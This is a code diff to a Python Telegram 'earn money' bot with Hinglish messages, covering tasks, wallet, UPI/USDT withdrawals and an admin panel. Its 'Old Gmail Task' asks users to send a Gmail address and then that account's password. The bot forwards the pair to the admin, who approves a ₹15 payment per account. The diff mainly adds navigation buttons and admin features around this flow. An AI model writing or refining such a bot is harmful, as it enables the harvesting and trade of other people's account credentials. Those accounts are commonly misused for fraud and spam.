@@ -74,8 +74,20 @@ def main_menu(user_id):
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
     user_id = message.chat.id
+    
+    # Check if user is new
+    cursor.execute("SELECT user_id FROM users WHERE user_id=?", (user_id,))
+    is_new = cursor.fetchone() is None
+    
     get_balance(user_id) 
     
+    # If new user, notify Admin
+    if is_new and user_id != ADMIN_ID:
+        try:
+            bot.send_message(ADMIN_ID, f"🚀 *New User Started Bot!*\n\n👤 *User ID:* `{user_id}`\n👤 *Name:* {message.from_user.first_name}", parse_mode="Markdown")
+        except:
+            pass
+
     msg = (f"✨ *WELCOME TO OUR BOT!* ✨\n\n"
            f"Hello {message.from_user.first_name}, yahan aap simple tasks complete karke real cash earn kar sakte hain! 💸\n\n"
            f"👇 *Niche diye gaye buttons se apna task shuru karein:*")
@@ -96,12 +108,15 @@ def handle_text(message):
                "👉 *Complete the task and click the button below!*")
         markup = InlineKeyboardMarkup()
         markup.add(InlineKeyboardButton("✅ Click Here When Done", callback_data="task_done"))
+        markup.add(InlineKeyboardButton("🔙 Back to Main", callback_data="back_to_main"))
         bot.send_message(user_id, msg, parse_mode="Markdown", reply_markup=markup)
 
     elif text == "📧 Old Gmail Task":
+        markup = InlineKeyboardMarkup()
+        markup.add(InlineKeyboardButton("🔙 Back to Main", callback_data="back_to_main"))
         msg = ("📧 *OLD GMAIL TASK*\n\n"
-               "👉 Kripya apna **Old Gmail Account** yahan bhejein (jise aap submit karna chahte hain):")
-        bot.send_message(user_id, msg, parse_mode="Markdown", reply_markup=telebot.types.ReplyKeyboardRemove())
+               "👉 Kripya apna **Old Gmail Account** yahan bhejein:")
+        bot.send_message(user_id, msg, parse_mode="Markdown", reply_markup=markup)
         user_states[user_id] = {'state': 'old_gmail_email'}
 
     elif text == "💰 Wallet":
@@ -121,14 +136,14 @@ def handle_text(message):
             icon = "🟢" if r[0] == "CREDIT" else "🔴"
             r_usd = r[1] / USDT_TO_INR_RATE
             msg += f"{icon} *₹{r[1]} (${r_usd:.2f}u)* | {r[2]}\n📅 {r[3]}\n\n"
-        bot.send_message(user_id, msg, parse_mode="Markdown")
+        bot.send_message(user_id, msg, parse_mode="Markdown", reply_markup=main_menu(user_id))
 
     elif text == "📞 Contact & Help":
         msg = ("📞 *CONTACT & SUPPORT*\n\n"
                "Agar aapko koi problem aa rahi hai ya payment se related koi sawal hai, toh humare Admin se direct baat karein:\n\n"
                f"👨‍💻 *Admin ID:* @{ADMIN_USERNAME}\n"
                "💬 _Click on the username to send a message._")
-        bot.send_message(user_id, msg, parse_mode="Markdown")
+        bot.send_message(user_id, msg, parse_mode="Markdown", reply_markup=main_menu(user_id))
 
     elif text == "💸 Withdraw":
         markup = ReplyKeyboardMarkup(resize_keyboard=True)
@@ -141,6 +156,8 @@ def handle_text(message):
         bot.send_message(user_id, msg, parse_mode="Markdown", reply_markup=markup)
         
     elif text == "🔙 Back to Main":
+        if user_id in user_states:
+            del user_states[user_id]
         bot.send_message(user_id, "🏠 *Main Menu*", parse_mode="Markdown", reply_markup=main_menu(user_id))
 
     elif text in ["🏦 UPI", "🪙 USDT"]:
@@ -148,7 +165,7 @@ def handle_text(message):
         if text == "🏦 UPI":
             min_amount = 15.0
             if balance_inr < min_amount:
-                bot.send_message(user_id, f"❌ *Insufficient Balance!*\nMinimum withdrawal ke liye ₹{min_amount} chahiye.", parse_mode="Markdown")
+                bot.send_message(user_id, f"❌ *Insufficient Balance!*\nMinimum withdrawal ke liye ₹{min_amount} chahiye.", parse_mode="Markdown", reply_markup=main_menu(user_id))
             else:
                 bot.send_message(user_id, f"📝 Kripya apna withdrawal amount likhein in **INR (₹)** (Min: ₹15):", parse_mode="Markdown", reply_markup=telebot.types.ReplyKeyboardRemove())
                 user_states[user_id] = {'state': 'withdraw_amount', 'method': text}
@@ -156,7 +173,7 @@ def handle_text(message):
             min_usd = 0.16
             min_inr = min_usd * USDT_TO_INR_RATE
             if balance_inr < min_inr:
-                bot.send_message(user_id, f"❌ *Insufficient Balance!*\nMinimum withdrawal ke liye ${min_usd} USD (₹{min_inr:.2f}) chahiye.", parse_mode="Markdown")
+                bot.send_message(user_id, f"❌ *Insufficient Balance!*\nMinimum withdrawal ke liye ${min_usd} USD (₹{min_inr:.2f}) chahiye.", parse_mode="Markdown", reply_markup=main_menu(user_id))
             else:
                 bot.send_message(user_id, f"📝 Kripya apna withdrawal amount likhein in **USDT ($)** (Min: $0.16):", parse_mode="Markdown", reply_markup=telebot.types.ReplyKeyboardRemove())
                 user_states[user_id] = {'state': 'withdraw_amount', 'method': text}
@@ -165,19 +182,21 @@ def handle_text(message):
         cursor.execute("SELECT detail, amount, date FROM history WHERE user_id=? AND type='DEBIT' ORDER BY id DESC LIMIT 10", (user_id,))
         records = cursor.fetchall()
         if not records:
-            bot.send_message(user_id, "📝 _Aapki koi withdrawal history nahi hai._", parse_mode="Markdown")
+            bot.send_message(user_id, "📝 _Aapki koi withdrawal history nahi hai._", parse_mode="Markdown", reply_markup=main_menu(user_id))
         else:
             msg = "📜 *WITHDRAWAL HISTORY:*\n\n"
             for r in records:
                 r_usd = r[1] / USDT_TO_INR_RATE
-                msg += f"🔴 *₹{r[1]} (${r_usd:.2f}u)* | {r[0]}\n📅 {r[1]}\n\n"
-            bot.send_message(user_id, msg, parse_mode="Markdown")
+                msg += f"🔴 *₹{r[1]} (${r_usd:.2f}u)* | {r[0]}\n📅 {r[2]}\n\n"
+            bot.send_message(user_id, msg, parse_mode="Markdown", reply_markup=main_menu(user_id))
 
     # --- ADMIN PANEL OPTIONS ---
     elif text == "⚙️ Admin Panel" and user_id == ADMIN_ID:
         markup = InlineKeyboardMarkup()
+        markup.row(InlineKeyboardButton("📊 Total Users", callback_data="admin_total_users"))
         markup.row(InlineKeyboardButton("📢 Broadcast Message", callback_data="admin_broadcast"))
         markup.row(InlineKeyboardButton("💸 Add Balance to User", callback_data="admin_addbal"))
+        markup.row(InlineKeyboardButton("🔙 Back to Main", callback_data="back_to_main"))
         bot.send_message(user_id, "🛠️ *ADMIN PANEL*\nKripya option select karein:", parse_mode="Markdown", reply_markup=markup)
 
     # --- DYNAMIC STATES HANDLING ---
@@ -188,7 +207,10 @@ def handle_text(message):
         if state_data['state'] == 'old_gmail_email':
             gmail_email = text
             user_states[user_id] = {'state': 'old_gmail_password', 'gmail_email': gmail_email}
-            bot.send_message(user_id, f"✅ Email saved: `{gmail_email}`\n\n👉 Ab iska *Password* bhejein:", parse_mode="Markdown")
+            
+            markup = InlineKeyboardMarkup()
+            markup.add(InlineKeyboardButton("🔙 Back to Main", callback_data="back_to_main"))
+            bot.send_message(user_id, f"✅ Email saved: `{gmail_email}`\n\n👉 Ab iska *Password* bhejein:", parse_mode="Markdown", reply_markup=markup)
 
         # Old Gmail Task - Step 2: Password received, submit to Admin
         elif state_data['state'] == 'old_gmail_password':
@@ -197,7 +219,6 @@ def handle_text(message):
             
             bot.send_message(user_id, "✅ *Old Gmail Submitted!*\nAapka task Admin ke paas bhej diya gaya hai. Check hone ke baad reward add ho jayega.", parse_mode="Markdown", reply_markup=main_menu(user_id))
             
-            # Send to Admin Panel
             markup = InlineKeyboardMarkup()
             markup.row(InlineKeyboardButton("✅ Approve", callback_data=f"oldappr_{user_id}"),
                        InlineKeyboardButton("❌ Reject", callback_data=f"oldrej_{user_id}"))
@@ -237,7 +258,9 @@ def handle_text(message):
                 user_states[user_id]['state'] = 'withdraw_address'
                 
                 ask_str = "UPI ID" if method == "🏦 UPI" else "USDT (TRC20/BEP20) Address"
-                bot.send_message(user_id, f"✅ Amount saved: {input_val} {'₹' if method == '🏦 UPI' else '$'}\n\n👉 Ab apna *{ask_str}* bhejein:", parse_mode="Markdown")
+                markup = InlineKeyboardMarkup()
+                markup.add(InlineKeyboardButton("🔙 Back to Main", callback_data="back_to_main"))
+                bot.send_message(user_id, f"✅ Amount saved: {input_val} {'₹' if method == '🏦 UPI' else '$'}\n\n👉 Ab apna *{ask_str}* bhejein:", parse_mode="Markdown", reply_markup=markup)
             except ValueError:
                 bot.send_message(user_id, "❌ Sirf numbers mein amount likhein.", parse_mode="Markdown", reply_markup=main_menu(user_id))
                 del user_states[user_id]
@@ -323,19 +346,36 @@ def handle_all_media(message):
 def callback_query(call):
     user_id = call.message.chat.id
 
-    if call.data == "task_done":
+    if call.data == "back_to_main":
+        if user_id in user_states:
+            del user_states[user_id]
+        try:
+            bot.delete_message(user_id, call.message.message_id)
+        except:
+            pass
+        bot.send_message(user_id, "🏠 *Main Menu*", parse_mode="Markdown", reply_markup=main_menu(user_id))
+
+    elif call.data == "task_done":
         bot.send_message(user_id, "📸 Kripya task complete karne ke baad **Screenshot** bhejein.", parse_mode="Markdown")
         user_states[user_id] = {'state': 'waiting_for_screenshot'}
 
+    elif call.data == "admin_total_users" and user_id == ADMIN_ID:
+        users = get_all_users()
+        total = len(users)
+        bot.answer_callback_query(call.id, f"Total Users: {total}", show_alert=True)
+
     elif call.data == "admin_broadcast" and user_id == ADMIN_ID:
-        bot.send_message(user_id, "📢 *Broadcast Mode*\n\nJo message aap sabko bhejna chahte hain, wo mujhe bhejein (Text, Photo ya Video kuch bhi).", parse_mode="Markdown")
+        markup = InlineKeyboardMarkup()
+        markup.add(InlineKeyboardButton("🔙 Back to Main", callback_data="back_to_main"))
+        bot.send_message(user_id, "📢 *Broadcast Mode*\n\nJo message aap sabko bhejna chahte hain, wo mujhe bhejein (Text, Photo ya Video kuch bhi).", parse_mode="Markdown", reply_markup=markup)
         user_states[user_id] = {'state': 'admin_wait_broadcast'}
 
     elif call.data == "admin_addbal" and user_id == ADMIN_ID:
-        bot.send_message(user_id, "💸 *Add Balance Mode*\n\n👉 Kripya us user ka *Telegram ID* bhejein jisme paise add karne hain:", parse_mode="Markdown")
+        markup = InlineKeyboardMarkup()
+        markup.add(InlineKeyboardButton("🔙 Back to Main", callback_data="back_to_main"))
+        bot.send_message(user_id, "💸 *Add Balance Mode*\n\n👉 Kripya us user ka *Telegram ID* bhejein jisme paise add karne hain:", parse_mode="Markdown", reply_markup=markup)
         user_states[user_id] = {'state': 'admin_wait_uid'}
 
-    # Old Gmail Task Approval
     elif call.data.startswith("oldappr_"):
         target_user = int(call.data.split("_")[1])
         add_balance(target_user, 15.0, "Old Gmail Task Approved")
@@ -416,5 +456,5 @@ def handle_photo(message):
         handle_all_media(message)
 
 # --- START BOT ---
-print("Bot with Old Gmail Task is running...")
+print("Bot is fully updated, bug-free, and running...")
 bot.polling(none_stop=True)
